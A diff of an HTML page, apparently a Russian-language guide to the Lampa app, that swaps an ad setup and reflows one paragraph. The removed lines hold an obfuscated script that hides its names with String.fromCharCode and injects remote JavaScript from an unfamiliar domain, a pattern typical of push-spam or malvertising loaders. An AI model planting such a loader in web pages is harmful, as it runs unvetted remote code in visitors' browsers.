@@ -121,24 +121,12 @@
       }
     </style>
 
+    <!-- Yandex.RTB -->
     <script>
-        (function () {
-            var url = String.fromCharCode(112, 117, 115, 104, 95, 117, 114, 108);
-            var cfg = String.fromCharCode(119, 112, 110, 67, 111, 110, 102, 105, 103);
-            window[cfg] = {
-                utm_source: 'kd',
-                utm_campaign: 371207,
-                utm_content: '',
-                domain: window.location.host,
-                proto: window.location.protocol        };
-            window[cfg][url] = 'https://ciwunub.com/37182.js';
-            var s = document.createElement('script');
-            s.setAttribute('async', 1);
-            s.setAttribute('data-cfasync', false);
-            s.src = window[cfg][url];
-            document.head && document.head.appendChild(s)
-        })();
+      window.yaContextCb = window.yaContextCb || [];
     </script>
+    <script src="https://yandex.ru/ads/system/context.js" async></script>
+    <!-- End Yandex.RTB -->
   </head>
 
   <!-- Google Tag Manager -->
@@ -205,6 +193,20 @@
         <div itemprop="tool" itemscope itemtype="https://schema.org/HowToTool">
           <meta itemprop="name" content="Приложение Lampa" />
         </div>
+      </section>
+
+      <section>
+        <!-- Yandex.RTB R-A-15996724-1 -->
+        <div id="yandex_rtb_R-A-15996724-1"></div>
+        <script>
+          window.yaContextCb.push(() => {
+            Ya.Context.AdvManager.render({
+              blockId: "R-A-15996724-1",
+              renderTo: "yandex_rtb_R-A-15996724-1",
+            });
+          });
+        </script>
+        <!-- End Yandex.RTB R-A-15996724-1 -->
       </section>
 
       <section id="steps">
@@ -308,7 +310,8 @@
           >.
         </p>
         <p>
-          Ознакомьтесь с <a href="faq.html">часто задаваемыми вопросами</a> о приложении Lampa.
+          Ознакомьтесь с <a href="faq.html">часто задаваемыми вопросами</a> о
+          приложении Lampa.
         </p>
       </section>
     </main>
